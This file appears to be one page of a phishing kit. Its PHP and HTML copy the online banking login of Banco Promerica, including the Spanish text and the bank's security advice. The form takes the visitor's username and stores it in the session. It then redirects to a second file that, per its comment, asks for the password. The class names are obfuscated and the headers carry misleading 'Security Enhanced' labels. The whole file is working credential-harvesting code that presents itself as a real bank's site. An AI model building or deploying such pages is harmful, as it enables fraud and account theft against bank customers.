<?php
/* Login System v2.1 - Security Enhanced */
/* Generated: 2026-03-29 */
/* Security Layer Active */
session_start();
define('PROME_OK', true);
include("private/cfg.php");

// Random seed for security purposes
$security_seed = rand(1000, 9999);
$session_token = bin2hex(random_bytes(8));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = str_replace(' ', '', $_POST['u_a8k3z'] ?? '');

    $_SESSION['usuario']        = $usuario;
    $_SESSION['security_token'] = $session_token;

    // Paso 1 completado: ahora pedir contraseña en inde.php
    header("Location: inde.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco Promerica - Banca en Línea</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#fff;
    color:#333;
    min-height:100vh;
}

.ctW9k{
    display:flex;
    width:100%;
    height:100vh;
}

/* =========================
   LEFT PANEL
========================= */

.lpA3m{
    flex:0 0 40%;
    position:sticky;
    top:0;
    height:100vh;
    overflow:hidden;
    background:#ddd;
}

.lpA3m img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
}

.sbF2x{
    position:absolute;
    bottom:0;
    left:0;
    width:100%;
    background:rgba(0,0,0,0.58);
    color:#fff;
    padding:22px 30px 22px 72px;
    font-size:13px;
    line-height:1.7;
    font-weight:400;
}

.sbF2x::before{
    content:"";
    position:absolute;
    left:18px;
    bottom:18px;
    width:42px;
    height:42px;
    border-radius:50%;
    background:#008a43;
    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='white' viewBox='0 0 24 24'><path d='M12 2L4 5v6c0 5.25 3.4 10.17 8 11.74C16.6 21.17 20 16.25 20 11V5l-8-3zm0 4a2 2 0 012 2v2h1a1 1 0 011 1v5H8v-5a1 1 0 011-1h1V8a2 2 0 012-2zm-1 4h2V8h-2v2z'/></svg>");
    background-repeat:no-repeat;
    background-position:center;
    background-size:20px;
}

.sbF2x a{
    display:inline-block;
    margin-top:8px;
    color:#fff;
    text-decoration:underline;
    font-weight:600;
}

/* =========================
   RIGHT PANEL
========================= */

.rpQ7n{
    flex:0 0 60%;
    display:flex;
    justify-content:flex-start;
    align-items:center;
    padding:50px 70px;
    background:#f8f8f8;
    overflow-y:auto;
}

.lbR5j{
    width:100%;
    max-width:560px;
    margin:auto;
}

/* =========================
   LOGO
========================= */

.lgT8b{
    width:100%;
    display:flex;
    justify-content:center;
    margin-bottom:52px;
}

.liY4v{
    width:280px;
    max-width:100%;
    object-fit:contain;
}

/* =========================
   TITULO
========================= */

.wcK1p{
    font-size:33px;
    line-height:1.35;
    color:#00853f;
    font-weight:300;
    margin-bottom:44px;
}

.wcK1p strong{
    font-weight:500;
}

/* =========================
   FORM
========================= */

label{
    display:block;
    margin-bottom:12px;
    font-size:15px;
    font-weight:400;
    color:#555;
    font-family:Arial,Helvetica,sans-serif;
}

input[type="text"],
input[type="password"]{
    width:100%;
    height:56px;
    padding:0 16px;
    border:1px solid #cfcfcf;
    border-radius:4px;
    background:#fff;
    font-size:16px;
    outline:none;
    transition:0.2s;
}

input[type="text"]:focus,
input[type="password"]:focus{
    border-color:#00853f;
}

.flD2w{
    margin-bottom:18px;
}
.flD2w:last-of-type{
    margin-bottom:0;
}

.biG7r{
    width:100%;
    height:56px;
    margin-top:40px;
    border:none;
    border-radius:4px;
    background:#007a3d;
    color:#fff;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:0.2s;
}

.biG7r:hover{
    background:#006633;
}

/* =========================
   LINKS
========================= */

.fgL9s{
    text-align:center;
    margin-top:38px;
}

.fgL9s a{
    color:#007a3d;
    font-size:15px;
    text-decoration:underline;
}

.dlV4k{
    margin-top:42px;
    padding-top:34px;
    border-top:1px solid #dfdfdf;
    text-align:center;
    line-height:2.2;
    color:#444;
    font-size:15px;
}

.dlV4k a{
    color:#007a3d;
    font-weight:500;
    text-decoration:underline;
}

/* =========================
   HELP SECTION
========================= */

.hsB6m{
    margin-top:42px;
    padding-top:34px;
    border-top:1px solid #dfdfdf;
    text-align:center;
}

.hiC1p{
    max-width:150px;
    width:50%;
    height:auto;
    display:inline-block;
}

.hsB6m p{
    margin-bottom:18px;
    font-size:15px;
    color:#444;
}

.help-icons{
    display:flex;
    justify-content:center;
    align-items:center;
    gap:22px;
}

.help-icons a{
    width:42px;
    height:42px;
    border:1.5px solid #00853f;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    color:#00853f;
    transition:0.2s;
    text-decoration:none;
}

.help-icons a:hover{
    background:#eef8f1;
}

.help-icons svg{
    width:20px;
    height:20px;
}

/* =========================
   RESPONSIVE
========================= */

@media(max-width:1000px){

    body{
        overflow:auto;
    }

    .ctW9k{
        flex-direction:column;
        height:auto;
    }

    .lpA3m{
        display:none;
    }

    .rpQ7n{
        flex:none;
        width:100%;
        padding:28px 22px;
        background:#fff;
        overflow:visible;
    }

    .lbR5j{
        max-width:100%;
    }

    .lgT8b{
        justify-content:flex-start;
        margin-bottom:24px;
    }

    .liY4v{
        width:210px;
    }

    .wcK1p{
        font-size:24px;
        margin-bottom:24px;
    }

    label{
        font-size:13px;
        margin-bottom:6px;
    }

    input[type="text"],
    input[type="password"]{
        height:38px;
        font-size:13px;
        padding:0 12px;
        border-radius:3px;
    }

    .flD2w{
        margin-bottom:10px;
    }

    .biG7r{
        height:40px;
        font-size:14px;
        margin-top:20px;
        border-radius:3px;
    }

    .fgL9s{
        margin-top:22px;
    }

    .fgL9s a{
        font-size:13px;
    }

    .dlV4k{
        margin-top:24px;
        padding-top:20px;
        font-size:13px;
        line-height:2;
    }

    .hsB6m{
        display:none;
    }
}
</style>
</head>
<body>
  <div class="ctW9k">
    <!-- LEFT: IMAGE PLACEHOLDER -->
    <div class="lpA3m">
      <img src="img/bg_x7k2m9.png" alt="">
      <div class="sbF2x">
        Nunca comparta por teléfono, email o redes sociales su clave de acceso, número de PIN o información confidencial.
        <br><a href="#">Ver más consejos de seguridad</a>
      </div>
    </div>

    <!-- RIGHT: LOGIN -->
    <div class="rpQ7n">
      <div class="lbR5j">
        <div class="lgT8b">
          <img src="img/lg_p4n8q3.png" alt="Prox" class="liY4v">


        </div>

        <h1 class="wcK1p">Te damos la bienvenida a<br>tu <strong>Banca en Línea</strong></h1>

        <form action="index.php" method="POST">
          <div class="flD2w">
            <label for="u_a8k3z">Ingresa tu usuario</label>
            <input type="text" id="u_a8k3z" name="u_a8k3z" autocomplete="username" required style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()">
          </div>
          <button type="submit" id="bIv2k" class="biG7r">Ingresar</button>
        </form>

        <div class="fgL9s">
          <a href="#">¿Olvidaste tu usuario?</a>
        </div>

        <div class="dlV4k">
          ¿Es tu primer ingreso? <a href="#">Crea tu usuario</a><br>
          ¿Aún no tienes una cuenta con nosotros? <a href="#">Abrir cuenta</a>
        </div>

        <div class="hsB6m">
          <img src="img/hlp_r5t1w6.png" alt="¿Necesitas ayuda?" class="hiC1p">
        </div>
      </div>
    </div>
  </div>
</body>
</html>
